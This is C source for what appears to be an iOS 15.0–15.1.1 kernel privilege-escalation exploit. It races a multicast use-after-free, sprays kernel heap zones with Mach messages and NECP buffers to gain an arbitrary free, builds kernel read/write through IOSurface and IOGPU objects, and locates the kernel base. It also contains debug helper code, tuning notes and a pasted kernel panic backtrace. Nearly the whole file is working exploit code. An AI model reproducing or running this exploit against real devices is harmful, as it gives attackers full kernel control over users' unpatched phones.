#include "main.h"

#include "iokit.h"
#include "IOGPU.h"
#include "IOSurfaceRoot.h"
#include "kernel_rw.h"
#include "kernel_base.h"
#include "mcast.h"
#include "necp.h"
#include "port_utils.h"
#include "spray.h"

#include <mach/mach.h>
#include <pthread.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "kernel_rw.h"
#include "print.h"

#include "ENABLE_HELPER.h"

#if ENABLE_HELPER
#include "helper/offsets.h"
#include "helper/proc.h"
#include "helper/kextrw.h"
#include "helper/find_port.h"
#include "helper/find_IOSurface.h"

extern uint64_t gKernelSlide, gKernelBase;

#endif

// The ID of the IOSurface we're using.
extern uint32_t IOSurface_id;

// The user client connection to IOSurfaceRoot.
extern mach_port_t IOSurfaceRootUserClient;

io_connect_t iosurface_connect_krw;




#pragma clang diagnostic ignored "-Wdeprecated-declarations"

#define BYTECOPY_FIRST_TARGET (KHEAP_DATA_MAPPABLE_LOC + 0x3F8C - BYTECOPY_OFFSET_IPV6) // will copy over trailer size of kmsg (used for identification of which kmsg was corrupted)
#define BYTECOPY_SECOND_TARGET (KHEAP_DATA_MAPPABLE_LOC + 3 - BYTECOPY_OFFSET_IPV6) // will copy over highest byte of kmsg's message bits, turning a non-complex kmsg to a complex one if its size ends in 0x80 (MACH_MSGH_BITS_COMPLEX)
#define BYTECOPY_OFFSET_IPV6 0x28

#if ENABLE_HELPER && ENABLE_PROFILLING
#define PORTS_COUNT 0x10
#else
#define PORTS_COUNT (0x3a00) 
#endif
//PORTS_COUNT... 0x9c00 - abort or double free //0x9c00 - double free //0x9c50, 0x9d00 - kernel data abort //9f00 - success a little bit? //0x9a00 0x5a00

#define KMSG_SIZE 0x3F80 // the low 0x80 byte of this size will be copied to corrupt the message bits (setting 0x80000000, MACH_MSGH_BITS_COMPLEX)
#define UAF_BUFFER_KALLOC_1664_JOIN_COUNT 64 // UaF buffer ends up in default.kalloc.1664

#define IOSURFACE_SPRAY_UCS_COUNT 10

mach_port_t notif_port = MACH_PORT_NULL;
mach_port_t *kheap_default_ports = NULL;
uint8_t *IOSurfaceClient_array_buf = NULL;
mach_port_t *kheap_data_ports = NULL;
int kheap_data_idx = -1;
int extra_frees_for_device = -1;
io_connect_t iogpu_connect = MACH_PORT_NULL;

mach_port_t get_arb_free_holder(void)
{
    int success = 0;
    
    // reliability voodoo
    for (int i = 0; i < 3; ++i)
    {
        mcast_increase_race_reliability();
        printf("Increase reliability...\n");
    }
    
    // more reliability voodoo
    pthread_attr_t pattr;
    pthread_attr_init(&pattr);
    pthread_attr_set_qos_class_np(&pattr, QOS_CLASS_USER_INITIATED, 0);
        
    // initialize refill buffer, putting the target for the bytecopy primitive there
    uint8_t *necp_buf = malloc(4096);
    *(uint64_t *)(necp_buf + 0x278) = BYTECOPY_FIRST_TARGET;
    
    printf("Start (will fail if device has not been rebooted since last run)\n");
    kheap_data_idx = -1;
    for (int iterations = 0; iterations < 255; ++iterations)
    {
        pthread_t pt1;
        pthread_t pt2;
        int s = socket(AF_INET6, SOCK_DGRAM, 0);
        int necp_fd = necp_open(0);
        
        mcast_race_sock = s;
        
        // grow the buffer on which the UaF will be triggered to default.kalloc.1664 and
        // put it at its max size before next realloc will occur
        int ip = 0;
        for (ip = 0; ip < UAF_BUFFER_KALLOC_1664_JOIN_COUNT-2; ++ip)
        {
            mcast_join_group(ip);
        }
        
        // trigger the UaF in default.kalloc.1664, perform bytecopy primitive if refill is successful
        pthread_create(&pt1, &pattr, (void *(*)(void *))mcast_join_group, (void *)(uint64_t)ip);
        pthread_create(&pt2, &pattr, (void *(*)(void *))mcast_join_group, (void *)(uint64_t)(ip + 1));
        
        // refill the UaF buffer in default.kalloc.1664 during the race
        for (int i = 0; i < 10; ++i)
        {
            spray_default_kalloc_necp(necp_fd, necp_buf, 0x318);
        }
        
        // synchronize
        pthread_join(pt1, NULL);
        pthread_join(pt2, NULL);
        
        // find out if the refill succeeded, in which case a corrupted trailer size will be returned
        // for the holder of the corrupted kmsg, which has also had its message bits corrupted
        // (0x80000000 - MACH_MSGH_BITS_COMPLEX - now set)
        {
            for (int i = 0; i < PORTS_COUNT; ++i)
            {
                int sz = port_peek_trailer_size(kheap_data_ports[i]);
                if (sz != 8)
                {
                    printf("kheap_data_idx: %08X\n", i);
                    kheap_data_idx = i;
                    break;
                }
            }
            if (kheap_data_idx != -1)
            {
                success = 1;
                break;
            }
        }

        close(s);
        printf("iteration %d\n", iterations);
    }
    
    if (!success)
    {
        printf("Failed! Run exploit only once per boot\n");
        printf("Make sure you are on iOS 15.0 - 15.1.1 and reboot to try again\n");
        exit(1);
    }
    
    free(necp_buf);
    
    return kheap_data_ports[kheap_data_idx];
}

int exploitation_init(void)
{    
    kheap_data_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    kheap_default_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    mach_port_t *contained_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    mach_port_t *ool_ports = malloc(0x10000);
    uint8_t *kheap_data_spray_buf = malloc(0x4000);
    memset(kheap_data_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(kheap_default_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(contained_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(ool_ports, 0, 0x10000);
    memset(kheap_data_spray_buf, 0, 0x4000);
     
#if 1
    // initialize the inline data

    // fake descriptor for free primitive
    // *(uint32_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t)) = 1;
    // *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t)) = KHEAP_DEFAULT_MAPPABLE_LOC; // free primitive target
    // *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t) + sizeof(uint64_t)) = 0x000007F802110000; // disposition, size, etc
    // align a pointer here so that when the kmsg trailer size is corrupted, this pointer
    // will after that be followed and a second bytecopy performed where it points (kmsg message bits)
    *(uint64_t *)(kheap_data_spray_buf + 0x3F64) = BYTECOPY_SECOND_TARGET;
    
    // spray large sprays to map  KHEAP_DATA_MAPPABLE_LOC and KHEAP_DEFAULT_MAPPABLE_LOC
    // prepare all ports first
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        *ool_ports = port_new();
        contained_ports[i] = *ool_ports;

        // mach_port_t *pp = spray_default_kalloc_ool_ports(0x4000, 1, ool_ports);
        // kheap_default_ports[i] = pp[0];
        // free(pp);

        kheap_data_ports[i] = spray_data_kalloc_kmsg_single(kheap_data_spray_buf, KMSG_SIZE);
    }

#if ENABLE_HELPER
    // for (int i = 0; i < PORTS_COUNT; ++i)
    // {
    //     printf("kallocated address (type: KHEAP_DEFAULT) = 0x%llx\n", find_oolports_from_port(kheap_default_ports[i]));
    // }

    for (int i = 0; i < PORTS_COUNT; ++i) 
    {
        printf("kallocated address (type: KHEAP_DATA_BUFFERS) = 0x%llx\n", find_kmsgdata_from_port(kheap_data_ports[i]));
    }
#endif 

#if ENABLE_HELPER && ENABLE_PROFILLING

// FOR PROFILLING ....
    printf("[!] Try setting macro KHEAP_DATA_MAPPABLE_LOC to 0x%llx\n", (find_kmsgdata_from_port(kheap_data_ports[PORTS_COUNT-1])+(0x4000 * (0x1500))));
    printf("[!] Try setting macro KHEAP_DEFAULT_MAPPABLE_LOC to 0x%llx\n", (find_oolports_from_port(kheap_default_ports[PORTS_COUNT-1])-(0x4000 * (0x1500))));
    printf("[!] After setting macro, rerun with disable ENABLE_HELPER\n");
    while(1) {};
#endif
    
    notif_port = port_new();
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        mach_port_t prev;
        mach_port_request_notification(mach_task_self(), contained_ports[i], MACH_NOTIFY_NO_SENDERS, 0, notif_port, MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev);
        mach_port_deallocate(mach_task_self(), contained_ports[i]);
    }
#endif

#if 0

// initialize the inline data
    // align a pointer here so that when the kmsg trailer size is corrupted, this pointer
    // will after that be followed and a second bytecopy performed where it points (kmsg message bits)
    *(uint64_t *)(kheap_data_spray_buf + 0x3F64) = BYTECOPY_SECOND_TARGET;
    
    struct default_msg
    {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_port_descriptor_t desc_pad[9]; // TODO remove hack
        mach_msg_ool_ports_descriptor_t desc;
    };
    
    struct default_msg *msg = (struct default_msg *)kheap_data_spray_buf;
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
    msg->hdr.msgh_size = KMSG_SIZE;
    msg->body.msgh_descriptor_count = 10; // TODO remove hack
    
    msg->desc.deallocate = 0;
    msg->desc.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->desc.copy = MACH_MSG_VIRTUAL_COPY;
    msg->desc.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg->desc.count = (0x10000-8)/8;
    msg->desc.address = (void *)ool_ports;
     
    // prepare all ports first
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        contained_ports[i] = port_new();
        kheap_data_ports[i] = port_new();
    }
    
    // spray fast
    for (unsigned int i = 0; i < PORTS_COUNT; ++i)
    {
       *ool_ports = contained_ports[i];
       msg->hdr.msgh_remote_port = kheap_data_ports[i];
       kern_return_t kr = mach_msg_send((mach_msg_header_t *)msg);
       if (kr) {
           *(int *)1 = 0;
       }
    }

#if ENABLE_HELPER
    for (int i = 0; i < PORTS_COUNT; ++i) 
    {
        printf("kallocated address (type: KHEAP_DATA_BUFFERS) = 0x%llx\n", find_kmsgdata_from_port(kheap_data_ports[i]));
    }
#endif 
        
    notif_port = port_new();
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        mach_port_t prev;
        mach_port_request_notification(mach_task_self(), contained_ports[i], MACH_NOTIFY_NO_SENDERS, 0, notif_port, MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev);
        mach_port_deallocate(mach_task_self(), contained_ports[i]);
    }

#endif
    
    // pre-init kernel rw
    IOSurfaceClient_array_buf = calloc(1, 0x10000);
    kernel_rw_preinit(KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10, IOSurfaceClient_array_buf, 0x4000);
    
    free(contained_ports);
    free(ool_ports);
    free(kheap_data_spray_buf);
    
    return 0;
}

int exploitation_get_krw_with_arb_free(mach_port_t arb_free_holder, uint64_t *kernel_base)
{
    int fildes[2];
    pipe(fildes);
    int read_pipe = fildes[0];
    int write_pipe = fildes[1];
    
    pipe(fildes);
    int read_pipe2 = fildes[0];
    int write_pipe2 = fildes[1];
    
    uint8_t null_buf[0x10000] = {0};
    uint8_t msg_buf[0x10000] = {0};
    uint8_t buf41[0x10000] = {0};
    memset(buf41, 0x41, 0x10000);

    // alloc these before array of IOSurfaceClients becomes 0x10000
    mach_port_t iosurface_spray_ucs[IOSURFACE_SPRAY_UCS_COUNT];
    for (int i = 0; i < IOSURFACE_SPRAY_UCS_COUNT; ++i)
    {
        iosurface_spray_ucs[i] = IOSurfaceRoot_init();
    }

    // cause max size of arrays of IOSurfaceClients to become 0x10000
    uint32_t last_id = IOSurfaceRoot_cause_array_size_to_be_0x10000();

    // TODO fill 0x10000 gaps here
    
    // trigger arbitrary free in kheap default
    port_destroy(arb_free_holder);
    
    write(write_pipe2, null_buf, 0x10000-1);
    
    printf("Past first refill\n");

        // find allocation at KHEAP_DEFAULT_MAPPABLE_LOC
    int orig_holder_idx = -1;
    for (uint32_t i = PORTS_COUNT-1;
         (i > 0) && port_has_msg(notif_port);
         --i)
    {
        // skip already free'd index and its adjacent locs which we'll use later
        if (i == kheap_data_idx || i == kheap_data_idx - 1 || i == kheap_data_idx - 2)
        {
            continue;
        }
        
        port_receive_msg(notif_port, msg_buf, sizeof(msg_buf));
       
        port_destroy(kheap_data_ports[i]);

        orig_holder_idx = i;
    }
    
    for (int i = 0; i < IOSURFACE_SPRAY_UCS_COUNT; ++i)
    {
        IOSurfaceRoot_lookup_surface(iosurface_spray_ucs[i], last_id);;
    }
    printf("orig_holder_idx %d/%d, last_id, 0x%08X\n", orig_holder_idx, PORTS_COUNT, last_id);
    
    // read out IOSurfaceClient
    read(read_pipe2, msg_buf, 0x10000-1);
    uint64_t *src = (uint64_t *)msg_buf;
    uint64_t IOSurfaceClient_ptr = src[last_id];
    printf("IOSurfaceClient ptr: %p\n", (void *)IOSurfaceClient_ptr);
    
    // point a fake IOSurfaceClient to kheap data
    uint64_t redirect[0x100];
    for (int i = 0; i < 0x100; ++i)
        redirect[i] = KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10;
    write(write_pipe2, redirect, 0x10000-1);

        // refill in kheap data
    port_destroy(kheap_data_ports[kheap_data_idx-1]);
    kheap_data_ports[kheap_data_idx-1] = MACH_PORT_NULL;
    write(write_pipe, IOSurfaceClient_array_buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);

    // find krw
    printf("Find krw...\n");

    while(1) {};


#if 0
    uint8_t msg_buf[0x100];
    int fildes[2];
    pipe(fildes);
    int read_pipe = fildes[0];
    int write_pipe = fildes[1];
    kern_return_t kr = KERN_SUCCESS;
    
    // alloc this one before array of IOSurfaceClients becomes 0x4000
    iosurface_connect_krw = IOSurfaceRoot_init();
    printf("iosurface_connect_krw = 0x%x\n", iosurface_connect_krw);

    // cause max size of arrays of IOSurfaceClients to become 0x4000
    uint32_t last_id = IOSurfaceRoot_cause_array_size_to_be_0x4000();
    printf("last_id = 0x%x\n", last_id);
    
    // trigger arbitrary free in kheap default
    kr = port_destroy(arb_free_holder);

    // XXX 
    // Hopefully my idea will be working;
    // Since IOSurfaceRoot_lookup_surface doesn't alloc arbitrary freed default kaddr, try port spray a little bit?
    mach_port_t *ool_ports = malloc(0x4000);
    memset(ool_ports, 0, 0x4000);
    *ool_ports = port_new();
    mach_port_t *pp = spray_default_kalloc_ool_ports(0x4000, 1, ool_ports);
    // printf("spray_default_kalloc_ool_ports() work?\n"); getchar();
    mach_port_t kheap_default_port = pp[0];
    printf("[!] kallocated address (type: KHEAP_DEFAULT) by spray_default_kalloc_ool_ports once called (so, sprayed only once) = 0x%llx\n", find_oolports_from_port(kheap_default_port));
    free(pp);
    port_destroy(kheap_default_port);
    printf("[!] port that once sprayed has been destroyed\n");

    // do refill in kheap default
    IOSurfaceRoot_lookup_surface(iosurface_connect_krw, last_id);

#if ENABLE_HELPER
    uint64_t surfRoot = port_to_kobject(iosurface_connect_krw);
    INFO("iosurface_connect_krw's IOSurfaceRootUserClient = 0x%llx\n", surfRoot);

	uint64_t surfClients = kextrw_kreadptr(surfRoot + 0x118);
	INFO("iosurface_connect_krw's IOSurfaceRootUserClient->m_IOSurfaceClientArrayPointer: 0x%llx\n", surfClients);
    getchar();
#endif

// #if ENABLE_HELPER
#if 0

    IOSurface_id = last_id;
    IOSurfaceRootUserClient = iosurface_connect_krw;    ///XXX Why don't you update?

    uint64_t userspaceValueDicts = userdict_from_IOSurface();

    struct kOSDict *dict = kernel_fetch_dict(userspaceValueDicts);
    uint64_t osdict_entry = 0;

    // https://github.com/wh1te4ever/xnu_1day_practice/blob/main/CVE-2019-8605/IOSurface_kread_observe/main.c#L98
    for (int i = 0; i < dict->count; i++) {
	    if(dict->items[i].value) {
            #if 0
            uint64_t osarray = dict->items[i].value;
            uint32_t osarray_count = kextrw_kread32(osarray + 0x14);	// 0x14 = p/x offsetof(OSArray, count)
            uint32_t osarray_capacity = kextrw_kread32(osarray + 0x18);	// 0x18 = p/x offsetof(OSArray, capacity)

            printf("osarray = 0x%llx, osarray_count = %u, osarray_capacity = %u\n", osarray, osarray_count, osarray_capacity);

            for(int i = 0; i < osarray_count; i++) {
                uint64_t osdata_in_osarray = OSArray_objectAtIndex(osarray, i);
		        uint64_t kbuffer = OSData_buffer(osdata_in_osarray);

                printf("osdata_in_osarray = 0x%llx, kbuffer = 0x%llx\n", osdata_in_osarray, kbuffer);
                // if(kbuffer !=0) {
                //     kextrw_khexdump(kbuffer, 0x100);
                // }
            }
            #endif

            #if 1
            uint32_t osdict_count = kextrw_kread32(dict->items[i].value + 0x14);   //off_osdictionary_count);
	        uint32_t osdict_capacity = kextrw_kread32(dict->items[i].value + 0x18);    //off_osdictionary_capacity);
            osdict_entry = kextrw_kreadptr(dict->items[i].value + 0x20); //off_osdictionary_dictionary);

            uint64_t osdictentry_key = kextrw_kreadptr(osdict_entry + 0);   //off_osdictentry_dict);  
            uint64_t osdict_kbuffer = kextrw_kreadptr(osdictentry_key + 0x10);  //off_osstring_string);

            INFO("OSDict from userspaceValueDicts[%u] = 0x%llx\n", i, dict->items[i].value);
            INFO("osdict_count = 0x%x, osdict_capacity = 0x%x, osdict_entry = 0x%llx\n", osdict_count, osdict_capacity, osdict_entry);
            INFO("osdictentry_key = 0x%llx\n", osdictentry_key);
            if(osdict_kbuffer != 0) {
                INFO("osdict_kbuffer = 0x%llx -> 0x%x\n", osdict_kbuffer, kextrw_kread32(osdict_kbuffer));
                // sleep(1);
                // kextrw_khexdump(osdict_kbuffer, 0x100);
            }
            
            // if(osdict_capacity == (82 MB / 0x10)) {
            //     uint64_t osdictentry_key = kread64(osdict_entry + off_osdictentry_dict);  
            //     uint64_t osdict_kbuffer = kread64(osdictentry_key + off_osstring_string);
                
            //     if(kread32(osdict_kbuffer) == 0xaabbcc) {
            //         SUCCESS("Found our 1st sprayed IOSurface data!\n");
            //         INFO("OSDict from userspaceValueDicts[%u] = 0x%llx\n", i, dict->items[i].value);
            //         INFO("osdict_count = 0x%x, osdict_capacity = 0x%x, osdict_entry = 0x%llx\n", osdict_count, osdict_capacity, osdict_entry);
            //         INFO("osdictentry_key = 0x%llx\n", osdictentry_key);
            //         INFO("osdict_kbuffer = 0x%llx -> 0x%x\n", osdict_kbuffer, kread32(osdict_kbuffer));
            //         break;
            //     }
            // }
            #endif
	    }
    }
    puts("============================");
    getchar();
#endif

    // NULL out array
    IOSurfaceRoot_release_all(iosurface_connect_krw);
    // printf("IOSurfaceRoot_release_all ret = 0x%x (%s\n", kr, mach_error_string(kr));

    // getchar();

    // find allocation at KHEAP_DEFAULT_MAPPABLE_LOC
    int kheap_default_idx = -1;
    for (uint32_t i = 0;
         (i < PORTS_COUNT) && port_has_msg(notif_port);
         i++)
    {
        port_receive_msg(notif_port, msg_buf, sizeof(msg_buf));
       
        port_destroy(kheap_default_ports[i]); // PANIC HERE...!

/*
(lldb) bt
* thread #2, name = 'CPU1', stop reason = breakpoint 1.1
  * frame #0: 0xfffffe0024922ea4 kernel.release.vmapple`panic(str="%s: double free of %p to zone %s%s @%s:%d") at debug.c:872:2 [opt]
    frame #1: 0xfffffe00249271b0 kernel.release.vmapple`zone_meta_double_free_panic(zone=0xfffffe00267231d8, ze=<unavailable>, caller="zfree_drop") at zalloc.c:753:2 [opt]
    frame #2: 0xfffffe00241a07c8 kernel.release.vmapple`zfree_drop(zone=0xfffffe00267231d8, meta=0xfffffe860708dc70, ze=(ze_value = 18446742022862667776), recirc=false) at zalloc.c:5263:3 [opt] [inlined]
    frame #3: 0xfffffe00241a07a8 kernel.release.vmapple`zfree_item(zone=0xfffffe00267231d8, meta=0xfffffe860708dc70, ze=(ze_value = 18446742022862667776)) at zalloc.c:5286:2 [opt]
    frame #4: 0xfffffe002419fe60 kernel.release.vmapple`zfree_ext(zone=0xfffffe00267231d8, zstats=0xfffffe1000318330, addr=<unavailable>) at zalloc.c:0 [opt]
    frame #5: 0xfffffe002414cfa8 kernel.release.vmapple`kfree_ext(kheap=0x0000000000000000, data=0xfffffe2280000000, size=16384) at kalloc.c:2127:2 [opt]
    frame #6: 0xfffffe00241180e8 kernel.release.vmapple`kfree(addr=<unavailable>, size=<unavailable>) at kalloc.c:2136:2 [opt] [inlined]
    frame #7: 0xfffffe00241180e0 kernel.release.vmapple`ipc_kmsg_clean_body(kmsg=<unavailable>, number=1, saddr=0xfffffe151de85a84) at ipc_kmsg.c:1760:4 [opt]
    frame #8: 0xfffffe0024117f68 kernel.release.vmapple`ipc_kmsg_clean(kmsg=0xfffffe151de85a00) at ipc_kmsg.c:1873:3 [opt]
    frame #9: 0xfffffe0024117e38 kernel.release.vmapple`ipc_kmsg_reap_delayed at ipc_kmsg.c:1671:3 [opt]
    frame #10: 0xfffffe0024122210 kernel.release.vmapple`ipc_port_destroy(port=0xfffffe151de83340) at ipc_port.c:1148:3 [opt]
    frame #11: 0xfffffe0024126d54 kernel.release.vmapple`ipc_right_destroy(space=<unavailable>, name=4325635, entry=<unavailable>, check_guard=<unavailable>, guard=<unavailable>) at ipc_right.c:1047:4 [opt]
    frame #12: 0xfffffe0024130ec8 kernel.release.vmapple`mach_port_destroy(space=0xfffffe150dacbc80, name=4325635) at mach_port.c:768:7 [opt]
    frame #13: 0xfffffe00241b0990 kernel.release.vmapple`_Xmach_port_destroy(InHeadP=0xfffffe151de7d38c, OutHeadP=0xfffffe151de85c8c) at mach_port_server.c:812:18 [opt]
    frame #14: 0xfffffe0024141220 kernel.release.vmapple`ipc_kobject_server_internal(port=<unavailable>, request=0xfffffe151de7d300, replyp=0xfffffe6029d5bc30) at ipc_kobject.c:472:3 [opt]
    frame #15: 0xfffffe0024140d74 kernel.release.vmapple`ipc_kobject_server(port=<unavailable>, request=0xfffffe151de7d300, option=<unavailable>) at ipc_kobject.c:580:8 [opt]
    frame #16: 0xfffffe00241188e8 kernel.release.vmapple`ipc_kmsg_send(kmsg=0xfffffe151de7d300, option=3, send_timeout=0) at ipc_kmsg.c:2202:10 [opt]
    frame #17: 0xfffffe00241302c8 kernel.release.vmapple`mach_msg_overwrite_trap(args=<unavailable>) at mach_msg.c:371:8 [opt]
    frame #18: 0xfffffe002425db2c kernel.release.vmapple`mach_syscall(state=0xfffffe15156b7850) at bsd_arm64.c:276:11 [opt]
    frame #19: 0xfffffe0024266e78 kernel.release.vmapple`handle_svc(state=0xfffffe15156b7850) at sleh.c:2411:3 [opt] [inlined]
    frame #20: 0xfffffe0024266e0c kernel.release.vmapple`sleh_synchronous(context=0xfffffe15156b7850, esr=<unavailable>, far=5503025152) at sleh.c:743:3 [opt]
    frame #21: 0xfffffe00240f879c kernel.release.vmapple`fleh_synchronous + 40
    frame #22: 0x0000000193905954
    frame #23: 0x0000000193922250
    frame #24: 0x000000010019a2ac
    frame #25: 0x0000000100198dd8
    frame #26: 0x00000001001990c0
    frame #27: 0x00000001001991cc
    frame #28: 0x00000001003150f4
*/



        kheap_default_idx = i;
    }
    
    // Note: don't add time sensitive code here, allocation at KHEAP_DEFAULT_MAPPABLE_LOC
    // has been free'd and will be refilled below
    
    // printf("Allocation at KHEAP_DEFAULT_MAPPABLE_LOC has been free'd\n");
    
    if (kheap_default_idx >= PORTS_COUNT)
    {
        printf("kheap_default_idx >= PORTS_COUNT\n");
        exit(1);
    }
    
    // extra frees
    for (int i = 0; i < extra_frees_for_device; ++i)
    {
        port_destroy(kheap_default_ports[(kheap_default_idx+1)+i]);
    }
    
    // do refill
    iogpu_connect = IOGPU_init();
    // add entry
    kr = IOGPU_create_command_queue(iogpu_connect, KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10);
    printf("IOGPU_create_command_queue kr = 0x%x (%s)\n", kr, mach_error_string(kr));
    
    // printf("kheap_default_idx: %08X\n", kheap_default_idx);
    // getchar();
    
    // refill in kheap data
    port_destroy(kheap_data_ports[kheap_data_idx-1]);
    write(write_pipe, IOSurfaceClient_array_buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);

    kernel_rw_init(iosurface_connect_krw, 1, read_pipe, write_pipe);
    
    kwrite32(KHEAP_DEFAULT_MAPPABLE_LOC, 0xFEED);
    uint32_t result = kread32(KHEAP_DEFAULT_MAPPABLE_LOC);
    printf("Test kwrite32 and kread32: %08X (should be 0000FEED)\n", result);
    if (result != 0xFEED)
    {
        printf("Failed! Reboot to try again (remember to only run once per boot)\n");
        exit(1);
    }
    
    printf("Get kernel base...\n");
    
    *kernel_base = kernel_base_from_holder(kheap_data_ports[kheap_data_idx-2], KHEAP_DATA_MAPPABLE_LOC - 0x8000);
    printf("Got kernel base: %p\n", (void *)*kernel_base);
#endif

    return 0;
}

void exploitation_cleanup(void)
{
    uint64_t command_queue_loc = kread64(KHEAP_DEFAULT_MAPPABLE_LOC + 8);
    uint64_t parent_loc = kread64(command_queue_loc + 0x488);
    uint64_t namespace_loc = kread64(parent_loc + 0x88);
    
    // bump refs
    kwrite32(command_queue_loc + 0x8, 10);
    kwrite32(namespace_loc + 0x8, 10);
    
    IOServiceClose(iogpu_connect);
}

int exploit_get_krw_and_kernel_base(uint64_t *kernel_base)
{
    uint64_t _kernel_base = 0;
    
    // generic exploitation init
    if (exploitation_init() != 0)
    {
        return 1;
    }
    
    // trigger bug, get arbitrary free
    mach_port_t arb_free_holder = get_arb_free_holder();
    printf("arb_free_holder = 0x%x\n", arb_free_holder);
    // getchar();
    
    // generic exploitation using arbitrary free
    exploitation_get_krw_with_arb_free(arb_free_holder, &_kernel_base);
    
    
    // generic exploitation cleanup (kernel r/w still active)
    exploitation_cleanup();
    
    *kernel_base = _kernel_base;
    
    return 0;
}

int exploit_go(void)
{
    uint64_t kernel_base = 0;
    
    if (exploit_get_krw_and_kernel_base(&kernel_base) != 0)
    {
        printf("Exploit failed!\n");
        return 1;
    }
    
    // test kernel r/w, read kernel base
    uint32_t mh_magic = kread32(kernel_base);
    if (mh_magic != 0xFEEDFACF)
    {
        printf("mh_magic != 0xFEEDFACF: %08X\n", mh_magic);
        return 1;
    }
    
    printf("kread32(_kernel_base) success: %08X\n", mh_magic);
    
    printf("Done\n");
    
    return 0;
}

int main(int argc, char *argv[], char *envp[]) {

#if ENABLE_HELPER
    if(kextrw_init() != 0) {
        printf("kextrw_init() failed!\n");
        while(1) {};
    }
    kextrw_get_kernel_base();
    offsets_init();

    // goto TEST;
#endif

    uint64_t kernel_base = 0;
    
    if (exploit_get_krw_and_kernel_base(&kernel_base) != 0)
    {
        printf("Exploit failed!\n");
        return 1;
    }
    
    // test kernel r/w, read kernel base
    uint32_t mh_magic = kread32(kernel_base);
    if (mh_magic != 0xFEEDFACF)
    {
        printf("mh_magic != 0xFEEDFACF: %08X\n", mh_magic);
        return 1;
    }
    
    printf("kread32(_kernel_base) success: %08X\n", mh_magic);
    
    printf("Done\n");

TEST:
    // uint64_t our_proc = proc_of_pid(getpid());
    // printf("our_proc = 0x%llx\n", our_proc);

    // uint64_t our_proc = proc_of_pid(getpid());
    // printf("our_proc = 0x%llx\n", our_proc);
    // printf("our_task = 0x%llx\n", proc_task(our_proc));

    // mach_port_t selfport = mach_task_self();
    // printf("port_kaddr = 0x%llx\n", find_port(selfport));


#if ENABLE_HELPER
    kextrw_deinit();
#endif

    return 0;
}